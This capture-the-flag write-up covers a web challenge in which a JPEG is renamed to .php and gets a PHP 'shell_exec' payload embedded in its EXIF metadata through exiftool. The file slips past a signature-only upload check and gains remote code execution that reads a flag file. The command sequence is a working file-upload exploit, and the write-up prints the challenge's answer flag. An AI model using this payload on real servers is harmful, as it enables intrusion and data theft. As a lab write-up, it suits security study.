---
title: "Cloud Storage V2 [WEB]"
categories: CodeCombat2023
permalink: /ctfs/codecombat2023/cloudstoragev2
---

Local File Inclusion leads to Remote Code Execution via PHP Injection.

## 📁 Challenge Description
>I've upgraded the upload system to a new one. You may no longer exploit it now!
>
>`http://cloudstorage.sibersiaga2023.myctf.io/`
>
>flag is in `/home/flag.txt`
>
>Flag format: `sibersiaga{md5hash}`

55.56 points, 9 solves

## 🚩 Solution
The challenge presents a slightly improved security for the file upload functionality on the website. The way it validates if an image file is safe to be uploaded is incomplete and can be bypassed easily. It does check whether it is an image by looking at the file signatures but it doesn't check using the file extension.

Hence, we can start by using a cute penguin image `penguin.jpeg`.

![penguin](https://github.com/pikaroot/pikaroot.github.io/assets/107750005/88cb5623-b1dd-47cf-a128-c27d06ba3b13)

Using `file penguin.jpeg` to check the file type.

```
┌──(kali㉿kali)-[~/finals/web/payloads]
└─$ file penguin.jpeg  
penguin.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 183x276, components 3
```

Change the file extension from `penguin.jpeg` to `penguin.php`.

```
┌──(kali㉿kali)-[~/finals/web/payloads]
└─$ cp penguin.jpeg penguin.php
```

Check the file type again. We can see that the file type remains unchanged despite the file extension has been modified with `cp` command.

```
┌──(kali㉿kali)-[~/finals/web/payloads]
└─$ file penguin.php
penguin.php: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 183x276, components 3
```

Upload it to the website and check for vulnerabilities.

![cloudstorage1](https://github.com/pikaroot/pikaroot.github.io/assets/107750005/dec3d978-14a7-4df9-bd5d-d215f88474d0)

We concluded that this challenge website is vulnerable to PHP injection attacks. We can inject a PHP shellcode stating the location of the flag (given by the challenge) to execute remotely and retrieve information from the website.

Now, inject a super duper simple PHP shell execution payload into the `penguin.php` using `exiftool`.

```
┌──(kali㉿kali)-[~/finals/web/payloads]
└─$ exiftool -DocumentName='<?php echo shell_exec("cat /home/flag.txt"); ?>' > penguin.php
    1 image files updated

┌──(kali㉿kali)-[~/finals/web/payloads]
└─$ exiftool penguin.php                                    
ExifTool Version Number         : 12.57
File Name                       : d.php
Directory                       : .
File Size                       : 3.5 kB
File Modification Date/Time     : 2023:08:15 09:57:23-04:00
File Access Date/Time           : 2023:08:31 10:59:34-04:00
File Inode Change Date/Time     : 2023:08:15 09:57:48-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Exif Byte Order                 : Big-endian (Motorola, MM)
Document Name                   : <?php echo shell_exec('cat /home/flag.txt');?>
X Resolution                    : 1
Y Resolution                    : 1
Resolution Unit                 : None
Y Cb Cr Positioning             : Centered
Image Width                     : 183
Image Height                    : 276
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 183x276
Megapixels                      : 0.051
```

{% capture notice-2 %}
💡 **NOTE**: We tried to inject using `-Note=` and `-Comment=` metadata parameters but it did not give any results. However, we ended up using `-DocumentName=` for the attack, and works. In our opinion, we think that any parameters will give the same results but the procedure of modifying the image file is incorrect.
{% endcapture %}

<div class="notice--info">{{ notice-2 | markdownify }}</div>

We can check the file type to see if our document name has added.

```
┌──(kali㉿kali)-[~/finals/web/payloads]
└─$ file d.php 
d.php: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=5, name=<?php echo shell_exec('cat /home/flag.txt');?>, xresolution=122, yresolution=130, resolutionunit=1], baseline, precision 8, 183x276, components 3
```

Upload the malicious file and we got a hit! The flag is then revealed.

![GGcloudstorage](https://github.com/pikaroot/pikaroot.github.io/assets/107750005/ab0fe0d8-36ce-47c6-8882-3f0d51137175)

***FLAG***: `sibersiaga{9c44f131b9d72f89d9a1c8520c42468d}`
